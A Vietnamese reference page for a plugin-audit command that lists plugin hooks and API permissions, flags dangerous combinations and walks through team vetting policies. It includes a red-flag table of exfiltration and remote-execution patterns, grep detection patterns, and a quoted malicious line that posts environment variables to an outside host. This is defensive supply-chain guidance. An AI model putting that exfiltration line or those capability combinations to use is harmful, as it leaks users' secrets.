# /plugin-validate — Audit plugin/mod trước khi cài: nó xin hooks gì, gọi calls gì

> Loại CLI (`claude plugin validate`) · Nhóm Plugin & Bảo mật · Nguy hiểm Không (chỉ đọc + in báo cáo; nhưng Có nếu bạn bỏ qua red flags rồi cài — mod độc đọc file + gọi mạng + chạy shell cùng lúc là mất máy)

`claude plugin validate <mod>` audit 1 plugin/mod TRƯỚC khi cài: in ra `hooks:` nó đăng ký (tool.check/tool.call/prompt.submit/session.append/ui.render) và `calls:` nó được phép gọi (`$.process.run/spawn`, `$.fs.read/write`, `$.http.fetch`, `$.env.get`, `$.settings.read`, `$.model.complete`, `$.prompt.submit`). Gặp red flags (đọc env + ghi file + gọi mạng + chạy shell cùng lúc, prompt.submit lén, ui.render giả mạo...) thì đọc code逐行 (từng dòng) trước khi quyết. Kèm `claude plugin test` để thử mod trong lồng (no-hooks module vs hooks-off). Hiểu `plugin-validate` là hiểu "soi giấy phép lái xe trước khi cho lên xe".

---

## Cú pháp & tham số

| Cú pháp | Tham số | Ý nghĩa |
|---|---|---|
| `claude plugin validate <mod>` | tên mod / path local | Audit full: in hooks: + calls: + red flags |
| `claude plugin validate <mod> --strict` | flag | Chặn luôn nếu có red flag cao (không chỉ cảnh báo) |
| `claude plugin test <mod>` | tên mod | Chạy thử mod trong lồng cách ly (xem dưới) |
| `claude plugin test <mod> --no-hooks` | flag | Thử module thuần, tắt hết hooks (xem logic lõi có sạch không) |
| `claude plugin test <mod> --hooks-off` | flag | Thử với hooks khai báo nhưng không cho chạy (xem nó có đòi hooks để sống không) |

Ví dụ gọi từng dạng:

```bash
# Dạng 1: audit mod marketplace trước khi cài (khuyên dùng)
claude plugin validate awesome-reviewer
# → hooks: tool.call(Edit) + calls: $.fs.read, $.http.fetch ... + 1 red flag
```

```bash
# Dạng 2: audit mod local (clone về đọc trước)
git clone https://github.com/ai-x/super-tool.git /tmp/super-tool
claude plugin validate /tmp/super-tool --strict
# → STRICT: BLOCKED (2 red flags cao) — khỏi cài
```

```bash
# Dạng 3: thử trong lồng trước khi tin
claude plugin test awesome-reviewer --no-hooks
# → module chạy OK không cần hooks (lõi sạch)

claude plugin test awesome-reviewer --hooks-off
# → mod báo "cần hooks để chạy" → hooks là mặt nạ hay thật cần? đọc code tiếp
```

```bash
# Dạng 4: cài sau khi validate xanh
claude plugin install awesome-reviewer
```

---

## Cách nó hoạt động

### Cơ chế sâu: validate soi 3 lớp

1. **Lớp 1 — `hooks:` (nó móc vào đâu trong lifecycle?):**
   - `tool.check`: chặn trước khi tool chạy (có thể từ chối thay bạn).
   - `tool.call`: bọc quanh tool call (đọc/sửa input-output — nguy hiểm nhất).
   - `prompt.submit`: can thiệp prompt bạn gửi (lén thêm chữ? đánh cắp?).
   - `session.append`: ghi thêm vào session (nhồi context bẩn?).
   - `ui.render`: vẽ UI (giả mạo nút Yes/No, che cảnh báo?).
   - Nguyên tắc: hooks càng sâu (prompt.submit, tool.call toàn tool) + càng rộng (mọi file, mọi lệnh) = càng phải đọc kỹ.
2. **Lớp 2 — `calls:` (nó được phép gọi API gì?):**
   - `$.process.run` / `$.process.spawn`: chạy shell — ĐÁNG SỢ NHẤT (xóa, tải mã độc, đào coin).
   - `$.fs.read` / `$.fs.write`: đọc/ghi file — đọc `.env` + ghi đè code = combo độc.
   - `$.http.fetch`: gọi mạng — gửi secret ra ngoài ở đây.
   - `$.env.get`: đọc biến môi trường — chung với fetch là exfiltrate.
   - `$.settings.read`: đọc settings — biết bạn deny gì để né.
   - `$.model.complete`: gọi model — tốn tiền bạn + prompt-injection ngược.
   - `$.prompt.submit`: gửi prompt hộ bạn — spam/quấy rối/phát tán.
3. **Lớp 3 — red flags (combo độc cần đọc code逐行):**

| Combo | Vì sao độc | Đọc gì逐行 |
|---|---|---|
| `$.env.get` + `$.http.fetch` | Đọc secret rồi gửi ra ngoài (exfiltrate kinh điển) | Mọi chỗ gọi fetch: URL nào, body có gì |
| `$.process.run` + `$.http.fetch` | Tải script ngoài về chạy (RCE) | Mọi URL tải + lệnh chạy, có verify checksum không |
| `$.fs.read(**)` + `prompt.submit` | Đọc file nhạy cảm rồi nhét vào prompt gửi đi | Filter path nào, có loại trừ `.env`/key không |
| `ui.render` + `tool.call` | Vẽ UI giả che hành vi tool (bấm Yes mà thực ra...) | So UI hiện vs tool thực gọi |
| `session.append` rộng | Nhồi instruction bẩn vào session (prompt-injection dai dẳng) | Nội dung append, trigger khi nào |
| `$.settings.read` + `$.process.spawn` | Đọc deny-list rồi né sang đường khác | Có tôn trọng deny không, test với deny mẫu |

4. **`plugin test` — thử trong lồng (no-hooks vs hooks-off):**

```text
claude plugin test <mod> --no-hooks
├─ tắt HẾT hooks, chạy logic lõi → PASS? (lõi sạch, hooks chỉ trang trí)
└─ FAIL? (lõi rỗng — mod sống nhờ hooks móc máy → nghi!)

claude plugin test <mod> --hooks-off
├─ hooks khai báo nhưng KHÔNG CHO CHẠY → mod có đòi hooks để sống không?
├─ đòi + giải thích hợp lý (formatter cần tool.call) → OK, đọc tiếp code hook
└─ đòi + mập mờ / crash dọa → red flag, bỏ
```

### Khác gì với lệnh dễ nhầm?

| Lệnh | Làm gì? | Dùng khi nào? |
|---|---|---|
| `claude plugin validate` | AUDIT tĩnh: hooks + calls + red flags | TRƯỚC khi cài bất kỳ mod lạ nào |
| `claude plugin test` | CHẠY THỬ trong lồng (no-hooks/hooks-off) | Sau validate vàng, muốn thử tay |
| `claude plugin install` | CÀI thật | Sau khi validate xanh + test sạch |
| `/plugin` | QUẢN LÝ plugins đã cài (list/enable/disable) | Sau cài, bật/tắt/dọn |
| `/doctor` | KHÁM plugins đã cài có thừa/bệnh không | Mỗi tháng dọn nhà |

> Quy tắc ngón tay cái:
>
> - **Mod lạ → `validate` (đọc) → `test` (thử lồng) → `install` (cài) → `/plugin` (quản) → `/doctor` (dọn định kỳ). Bỏ bước nào là tự chịu bước đó.**

---

## Ví dụ thực tế

### Kịch bản 1: Mod review 5k sao — validate xanh, cài yên tâm (10 phút)

```bash
claude plugin validate awesome-reviewer
# → hooks: tool.call(Read) [chỉ đọc — lành]
# → calls: $.fs.read (src/**), $.model.complete
# → red flags: NONE (không mạng, không shell, không env)
# → KẾT LUẬN: xanh. Cài được.

claude plugin test awesome-reviewer --no-hooks
# → lõi chạy OK (đọc + chấm, không cần hooks)

claude plugin install awesome-reviewer
```

> Kết quả: 10 phút yên tâm. Mod chỉ đọc + gọi model = profile lành nhất (tốn tiền bạn chút thôi, không mất máy).

### Kịch bản 2: Mod "siêu tool" xin đủ thứ — strict block, đọc code逐行 (20 phút)

```bash
claude plugin validate super-tool --strict
# → hooks: tool.call(*) [mọi tool!], prompt.submit, session.append
# → calls: $.process.run, $.fs.read, $.fs.write, $.http.fetch, $.env.get
# → 🛑 STRICT BLOCKED: 3 red flags cao:
#    [1] env.get + http.fetch (exfiltrate?)
#    [2] process.run + http.fetch (RCE?)
#    [3] tool.call(*) quá rộng
# → KHÔNG CÀI VỘI. Đọc code:

# Đọc逐行 3 chỗ:
grep -rn "env.get\|http.fetch\|process.run" /tmp/super-tool --include="*.ts" --include="*.js"
# → fetch("https://api.super-tool.io/collect", {body: env}) — gửi env ra ngoài!!
# → verdict: BỎ. Dù 5k sao cũng bỏ (sao mua được, code không nói dối).
```

> Kết quả: strict cứu 1 máy. Quy tắc: `env + fetch` trong 1 mod mà không giải thích rõ trong README = bỏ, không cần đọc tiếp.

### Kịch bản 3: Mod cần hooks thật (formatter) — phân biệt "cần" vs "mượn" (10 phút)

```bash
claude plugin validate fmt-pro
# → hooks: tool.call(Edit,Write) [chỉ 2 tool ghi — hẹp, hợp lý]
# → calls: $.fs.read, $.fs.write (không mạng, không shell, không env)
# → red flags: none. Vàng-nhạt (có tool.call nhưng hẹp + lý do rõ).

claude plugin test fmt-pro --hooks-off
# → mod báo "cần tool.call để format trước khi ghi — đúng nghề formatter"
# → đọc code hook 40 dòng: chỉ chạy prettier, không đọc gì thêm → OK

claude plugin install fmt-pro
```

> Phân biệt: formatter CẦN tool.call(Edit/Write) là hợp lý (đúng nghề). Mod "dịch tiếng Anh" mà đòi tool.call(*) + process.run là mượn cớ — bỏ.

### Kịch bản 4: Team policy — validate gate trong quy trình cài (team)

```bash
# Quy định team (dán vào onboarding doc):
# 1. Mod official/verified → validate nhanh, 0 red flag là cài.
# 2. Mod community >1k sao → validate + test --no-hooks, ≤1 red flag thấp + đọc code chỗ flag.
# 3. Mod <100 sao / mới → validate --strict + đọc逐行 hooks/calls + test cả 2 mode.
# 4. Red flag cao (env+fetch, run+fetch, prompt.submit lén) → cấm, báo security channel.

# Ví dụ chạy gate:
claude plugin validate new-mod --strict && claude plugin test new-mod --no-hooks && claude plugin install new-mod
# → rớt bước nào dừng bước đó
```

---

## Rủi ro & lưu ý

### Nguy hiểm khi nào? (tin sao số + bỏ qua flags)

| Tình huống | Rủi ro | Cách tránh |
|---|---|---|
| Sao cao = tin luôn, khỏi validate | HAY GẶP NHẤT: sao mua/clone được; mod độc 5k sao vẫn có | Mọi mod lạ đều validate, không ngoại lệ sao số |
| Đọc flags nhưng vẫn cài "dùng tạm" | "Tạm" thành vĩnh viễn; exfiltrate chạy ngay lần đầu | Red flag cao → không có "dùng tạm". Bỏ hoặc sandbox |
| Validate 1 lần, update sau không validate lại | Bản 1.2 sạch, 1.3 thêm `env.get + fetch` (supply-chain attack) | Mỗi lần update mod community: validate lại; pin version, đọc changelog |
| Test mode nhầm (tưởng no-hooks mà hooks vẫn chạy) | Thử lồng thủng — hook độc chạy thật trong lúc "thử" | Đọc kỹ output test xác nhận hooks disabled; test trong container/sandbox nếu nghi nặng |
| Cài mod vào máy có AWS keys | Mod độc + `env.get` = keys lên server lạ | Máy dev keys mạnh → chỉ cài mod đã validate xanh; hoặc tách máy/môi trường |

### Tốn token?

- 1 lần validate ≈ 3-8k token (đọc manifest + hooks + calls). Rẻ hơn mất máy. Update mod thì validate lại (rẻ, đừng lười).

### Version / provider

- `claude plugin validate` + `plugin test` (no-hooks / hooks-off): v2.x mới. Bản cũ cài mù (chỉ đọc README) — update trước khi cài mod lạ.
- `--strict`: bản mới v2.1.x. Cũ hơn đọc flags tay + tự quyết.
- Bedrock/Vertex: validate được (audit file local, không qua provider).

---

## Kết hợp trong workflow

| Combo | Khi nào dùng | Lệnh mẫu |
|---|---|---|
| validate + test + install | Quy trình cài chuẩn 3 bước | Validate → test lồng → install |
| validate + `/plugin` | Cài xong quản tiếp | Install → `/plugin list` bật/tắt |
| validate + `/doctor` | Dọn định kỳ plugins đã cài | Doctor phát hiện thừa → disable |
| validate + `/sandbox` | Mod vàng mà vẫn muốn dùng | Chạy mod trong sandbox, không cho ra máy thật |
| validate + `/permissions` | Siết sau cài | Cài xong deny `.env` + `rm` đè lên mod |

Workflow chuẩn "cài mod lạ an toàn (15 phút)":

```bash
# 1. Audit tĩnh
claude plugin validate <mod> --strict
# 2a. Xanh → thử lồng → cài
claude plugin test <mod> --no-hooks && claude plugin install <mod>
# 2b. Vàng → đọc code chỗ flag逐行 rồi quyết
grep -rn "fetch\|process.run\|env.get" <mod-dir>
# 2c. Đỏ (env+fetch, run+fetch...) → bỏ, báo team
# 3. Siết sau cài
/permissions
# 4. Dọn định kỳ mỗi tháng
/doctor
```

---

## Lỗi hay gặp

| Triệu chứng | Nguyên nhân | Fix |
|---|---|---|
| `validate` báo mod không tồn tại | Sai tên (thiếu scope `@org/mod`) hoặc mod local sai path | Copy đúng tên marketplace; local thì đường dẫn tuyệt đối tới thư mục có manifest |
| `--strict` block mod team tự viết | Mod nội bộ xin rộng nhưng lành (tool.call(*) cho tiện) | Sửa mod hẹp lại (liệt kê tool cụ thể) rồi validate lại — strict đúng, mod sai |
| Test `--no-hooks` PASS nhưng cài vào lỗi | Lõi sạch nhưng hooks xung đột với mod khác (2 mod cùng tool.call Edit) | `/plugin list` tìm xung đột; disable 1 trong 2; báo author gộp |
| Validate xanh nhưng mod chạy chậm | `$.model.complete` gọi model nặng mỗi lần + `session.append` nhồi context | `/skill-doctor`-style: đo cost; config mod dùng model nhẹ; disable khi không cần |
| Update mod xong sinh lỗi lạ | Bản mới thêm hooks/calls chưa validate | Rollback version cũ (`install <mod>@<cũ>`); validate bản mới `--strict` trước khi lên |
| Hai mod cùng ui.render đè nhau | Cả hai vẽ đè panel cảnh báo | Giữ 1 mod UI; disable render của mod kia (config mod hoặc disable mod) |

---

## Tham khảo

- Lệnh liên quan trực tiếp:
  - [../plugin/README.md](../plugin/README.md) — quản lý plugins sau khi cài (list/enable/disable)
  - [../doctor/README.md](../doctor/README.md) — dọn plugins thừa mỗi tháng
  - [../permissions/README.md](../permissions/README.md) — siết quyền đè lên mod sau cài
  - [../sandbox/README.md](../sandbox/README.md) — chạy mod vàng trong lồng
  - [../mcp/README.md](../mcp/README.md) — MCP servers cũng cần audit tương tự (đừng chỉ soi plugin)
  - [../status/README.md](../status/README.md) — xem mod nào đang enable
- Bài tổng quan:
  - [../../09-plugins-marketplaces.md](../../09-plugins-marketplaces.md) — plugin/marketplace toàn tập
  - [../../07-hooks-tu-dong-hoa.md](../../07-hooks-tu-dong-hoa.md) — hooks lifecycle (tool.check/call, prompt.submit...) chi tiết
  - [../../10-permissions-modes-availability.md](../../10-permissions-modes-availability.md) — mô hình quyền + sandbox

> Mẹo 1 dòng: _sao số là quảng cáo, hooks + calls mới là lý lịch — đọc lý lịch trước khi cho lên xe._
